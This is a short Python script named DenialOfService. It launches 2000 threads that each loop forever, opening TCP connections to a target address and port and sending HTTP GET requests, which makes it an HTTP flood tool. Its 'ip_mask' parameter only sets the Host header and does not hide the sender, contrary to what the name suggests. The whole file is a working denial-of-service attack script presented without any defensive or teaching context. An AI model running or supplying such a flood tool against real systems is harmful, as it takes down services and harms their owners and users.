import socket
import threading

class DenialOfService(object):
    def __init__(self, target="192.168.0.1", port=80, ip_mask="182.21.20.32"):
        self.target = target
        self.port = port
        self.ip_mask = ip_mask
        

    def run(self):
        for i in range(2000):
            thread = threading.Thread(target=self.attack).start()


    def attack(self):
        while True:
            print(f"Pinging {self.target}...")
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((self.target, self.port))
            connection.sendto((f"GET /{self.target} HTTP/1.1\r\n").encode("ascii"), (self.target, self.port))
            connection.sendto((f"Host: {self.ip_mask}\r\n\r\n").encode("ascii"), (self.target, self.port))
            connection.close()


if __name__ == "__main__":
    DenialOfService().run()
    

